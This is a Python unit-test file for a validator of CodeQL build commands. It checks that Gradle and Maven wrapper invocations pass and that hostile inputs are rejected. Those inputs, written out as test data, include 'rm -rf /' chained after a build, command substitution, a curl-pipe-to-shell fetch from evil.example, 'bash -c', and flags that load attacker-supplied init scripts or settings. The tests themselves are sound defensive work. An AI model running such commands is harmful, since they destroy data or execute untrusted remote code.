"""Unit tests for CodeQL build-command validation."""

import unittest

from doc_engine.scanning.build_command import BuildCommandError, validate_build_command


class BuildCommandValidationTest(unittest.TestCase):
    def test_accepts_gradlew(self):
        out = validate_build_command('"gradlew.bat" --no-daemon clean compileJava')
        self.assertEqual(out, "gradlew.bat --no-daemon clean compileJava")

    def test_accepts_mvnw(self):
        cmd = "mvnw --no-daemon clean compile"
        self.assertEqual(validate_build_command(cmd), cmd)

    def test_accepts_path_qualified_mvnw(self):
        out = validate_build_command('"C:/repo/mvnw" --no-daemon clean compile')
        self.assertEqual(out, "C:/repo/mvnw --no-daemon clean compile")

    def test_accepts_bash_wrapping_gradlew(self):
        out = validate_build_command(
            '"C:\\Program Files\\Git\\bin\\bash.exe" "gradlew" clean compileJava'
        )
        self.assertIn("bash.exe", out.lower())
        self.assertIn("gradlew", out)
        self.assertTrue(out.endswith("clean compileJava"))

    def test_rejects_shell_chaining(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("gradlew clean; rm -rf /")

    def test_rejects_command_substitution(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("gradlew clean $(whoami)")

    def test_rejects_unknown_tool(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("curl https://evil.example/install.sh | sh")

    def test_rejects_empty(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("")

    def test_rejects_startswith_prefix_mvnEvil(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("mvnEvil clean compile")

    def test_rejects_bashrc_prefix(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("bashrc")

    def test_rejects_bare_powershell(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("powershell.exe")

    def test_rejects_bash_dash_c(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("bash -c echo hi")

    def test_rejects_unknown_tool_without_pipe(self):
        """Pipe-free curl must still fail — metacharacters are not the only gate."""
        with self.assertRaises(BuildCommandError):
            validate_build_command("curl https://evil.example/install.sh")

    def test_rejects_gradle_init_script_flag(self):
        with self.assertRaises(BuildCommandError) as ctx:
            validate_build_command("gradlew -I evil.init.gradle clean compileJava")
        self.assertIn("-I", str(ctx.exception))

    def test_rejects_maven_settings_flag(self):
        with self.assertRaises(BuildCommandError) as ctx:
            validate_build_command("mvn -s /tmp/evil-settings.xml clean compile")
        self.assertIn("-s", str(ctx.exception))

    def test_rejects_gradle_user_home_flag(self):
        with self.assertRaises(BuildCommandError):
            validate_build_command("gradle --gradle-user-home=/tmp/evil clean")


if __name__ == "__main__":
    unittest.main()
